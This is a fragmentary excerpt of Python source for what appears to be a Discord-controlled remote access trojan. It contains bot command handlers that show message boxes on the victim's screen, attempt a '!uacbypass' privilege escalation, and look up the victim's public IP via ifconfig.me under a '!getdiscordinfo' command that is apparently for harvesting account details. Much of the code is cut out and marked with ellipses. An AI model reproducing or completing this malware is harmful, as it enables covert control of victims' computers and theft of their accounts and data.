    ...
    if message.channel.name != channel_name:
                    ...
                    for y in range(len(total)):
                        if "session" in total[y]:
                            channel_to_delete = discord.utils.get(
                                client.get_all_channels(), name=total[y])
        ...
        if message.content.startswith("!message"):
            ...
            def mess():
                ctypes.windll.user32.MessageBoxW(
                    0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP)  # Show message box
            import threading
        ...
        if message.content == "!uacbypass":
            ...
            if isAdmin():
                ...
                if message.content == "!uacbypass":
                    uncritproc()
                    test_str = sys.argv[0]
                    current_dir = inspect.getframeinfo(
        ...
        if message.content == "!getdiscordinfo":
            ...
            def whoTheFuckAmI():
                ip = "None"
                try:
                    ip = urlopen(Request("https://ifconfig.me")
                                 ).read().decode().strip()
                except:
                    pass
                return ip
